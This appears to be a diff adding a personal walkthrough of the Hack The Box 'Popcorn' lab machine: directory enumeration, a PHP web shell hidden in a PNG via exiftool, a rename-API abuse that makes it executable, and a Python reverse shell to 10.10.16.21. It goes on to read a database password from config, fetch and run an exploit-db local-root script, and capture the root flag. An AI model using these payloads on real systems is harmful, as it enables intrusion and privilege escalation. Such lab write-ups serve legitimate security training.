@@ -1,0 +1,109 @@
+
+└─$ sudo dirsearch -u http://popcorn.htb/torrent/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 
+/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 220544
+
+Output File: /home/ed/reports/http_popcorn.htb/_torrent__25-09-11_10-30-01.txt
+
+Target: http://popcorn.htb/
+
+[10:30:01] Starting: torrent/
+[10:30:04] 301 -  250B  - /torrent/images  ->  http://popcorn.htb/torrent/images/
+[10:30:04] 200 -   20B  - /torrent/download
+[10:30:04] 200 -    2KB - /torrent/login
+[10:30:05] 301 -  250B  - /torrent/templates  ->  http://popcorn.htb/torrent/templates/
+[10:30:07] 200 -  498B  - /torrent/rss
+[10:30:07] 301 -  248B  - /torrent/users  ->  http://popcorn.htb/torrent/users/
+[10:30:08] 301 -  249B  - /torrent/admin  ->  http://popcorn.htb/torrent/admin/
+[10:30:08] 301 -  249B  - /torrent/health  ->  http://popcorn.htb/torrent/health/
+[10:30:08] 200 -    2KB - /torrent/browse
+[10:30:09] 200 -  433B  - /torrent/comment
+[10:30:09] 301 -  249B  - /torrent/upload  ->  http://popcorn.htb/torrent/upload/
+[10:30:11] 301 -  247B  - /torrent/css  ->  http://popcorn.htb/torrent/css/
+[10:30:12] 200 -   20B  - /torrent/edit
+[10:30:13] 301 -  248B  - /torrent/lib  ->  http://popcorn.htb/torrent/lib/
+[10:30:14] 301 -  250B  - /torrent/database  ->  http://popcorn.htb/torrent/database/
+[10:30:15] 200 -   24B  - /torrent/secure
+[10:30:15] 301 -  247B  - /torrent/js  ->  http://popcorn.htb/torrent/js/
+[10:30:19] 200 -  161B  - /torrent/logout
+[10:30:21] 200 -   27KB - /torrent/preview
+[10:30:21] 200 -   20B  - /torrent/config
+[10:30:24] 301 -  250B  - /torrent/readme  ->  http://popcorn.htb/torrent/readme/
+[10:30:28] 200 -    2KB - /torrent/thumbnail
+[10:30:32] 301 -  247B  - /torrent/torrents  ->  http://popcorn.htb/torrent/torrents/
+[10:31:37] 200 -   20B  - /torrent/validator
+[10:32:22] 200 -    1KB - /torrent/hide
+[10:35:02] 301 -  248B  - /torrent/PNG  ->  http://popcorn.htb/torrent/PNG/
+
+http://popcorn.htb/torrent/torrents.php?mode=upload 
+//we can upload file here, but only torrent file is allowed.
+//https://kimbatt.github.io/torrent-creator/  use this web to create a torrent, whatever the content. and upload.
+
+//we ca view it in: browse --> http://popcorn.htb/torrent/torrents.php?mode=details&id=44b0fd3f1853460da61e6107e5beb88f2824485f
+// we can upload a screenshot for it. only img file is allowed and the size is also limited. remember to check the response header from BurpS.
+
+//use exiftool to add cmd shell in to the file without changine MIME type.
+
+http://popcorn.htb/rename/
+
+exiftool -DocumentName='<?php echo system($_GET["cmd"]);?>' 1.php.png 
+    1 image files updated
+
+Renamer API Syntax: index.php?filename=old_file_path_an_name&newfilename=new_file_path_and_name
+
+http://popcorn.htb/rename/index.php?filename=/var/www/torrent/upload/44b0fd3f1853460da61e6107e5beb88f2824485f.png&newfilename=/var/www/torrent/upload/s.php
+//on this page to view the page , and use cmd to launch reverse shell
+
+http://popcorn.htb/torrent/upload/s.php?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.10.16.21%22,8821));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22sh%22)%27
+
+python -c 'import pty;pty.spawn("/bin/sh")'
+
+╔══════════╣ Searching passwords in config PHP files
+/var/www/torrent/config.php:	$dbpass 	= $CFG->dbPassword;
+/var/www/torrent/config.php:	$dbuser 	= $CFG->dbUserName;
+/var/www/torrent/config.php:  $CFG->dbPassword = "SuperSecret!!";	//db password
+/var/www/torrent/config.php:  $CFG->dbUserName = "torrent";    //db username
+
+
+www-data@popcorn:/home/george/.cache$ ls -la
+ls -la
+total 8
+drwxr-xr-x 2 george george 4096 Mar 17  2017 .
+drwxr-xr-x 3 george george 4096 Oct 26  2023 ..
+-rw-r--r-- 1 george george    0 Mar 17  2017 motd.legal-displayed
+
+//find a intersting file , after some research, related to a vuln from exploitdb
+
+www-data@popcorn:/tmp$ wget http://10.10.16.21:8000/14339.sh
+wget http://10.10.16.21:8000/14339.sh
+--2025-09-12 17:27:57--  http://10.10.16.21:8000/14339.sh
+Connecting to 10.10.16.21:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3042 (3.0K) [text/x-sh]
+Saving to: `14339.sh'
+
+
+www-data@popcorn:/tmp$ chmod +x 14339.sh
+chmod +x 14339.sh
+www-data@popcorn:/tmp$ ./14339.sh
+./14339.sh
+[*] Ubuntu PAM MOTD local root
+[*] SSH key set up
+[*] spawn ssh
+[+] owned: /etc/passwd
+[*] spawn ssh
+[+] owned: /etc/shadow
+[*] SSH key removed
+[+] Success! Use password toor to get root
+Password: toor
+
+root@popcorn:/tmp# cd /root
+cd /root
+root@popcorn:~# cat root.txt
+cat root.txt
+5d8934fedfcb2d9ef575e63
